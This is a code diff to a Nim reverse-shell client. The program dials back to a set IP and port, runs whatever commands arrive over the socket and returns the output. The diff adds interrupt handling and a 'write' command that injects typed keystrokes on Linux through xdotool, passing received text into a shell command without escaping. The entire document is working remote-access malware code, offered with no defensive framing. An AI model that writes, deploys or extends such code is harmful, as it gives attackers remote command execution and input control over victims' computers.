@@ -1,5 +1,12 @@
 import net, httpclient, os, osproc, strformat, strutils, browsers
 
+type EKeyboardInterrupt = object of CatchableError
+
+proc handler() {.noconv.} =
+  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")
+
+setControlCHook(handler)
+
 var
     ip = "127.0.0.1"
     port = Port(5645)
@@ -12,7 +19,7 @@ try:
     s.send(&"{DIR}> ")
     while true:
         let message = s.recvLine()
-        let args = message.split(' ')
+        var args = message.split(' ')
 
         if message.startsWith("cd"):
             if os.dirExists(args[1]): os.setCurrentDir(args[1]);s.send(&"{DIR}> ") else: s.send("Error: directory not found")
@@ -48,14 +55,30 @@ IP address          =   {ip}
             s.send("Session ended")
             break
 
+        elif message.startsWith("write"):
+            case hostOS:
+                of "linux":
+                    args.delete(0)
+                    discard os.execShellCmd(&"""xdotool type '{args.join(" ")}' """)
+                    s.send(&"{DIR}> ")
+                
+                of "windows":
+                    s.send("Error: No implementation for windows systems, help is needed here!")
+                    s.send(&"{DIR}> ")
+
         else:
             let output = execCmdEx(message)
             s.send(output[0])
             s.send(&"{DIR}> ")
 
-except Exception as e:
-    echo "Session ended"
-    raise e
+
+except EKeyboardInterrupt:
+    s.send("\n" & "Interrupted by ^C")
+    quit(0)
+
+except:
+    quit(1)
 
 finally:
+    s.send("Session ended")
     s.close()
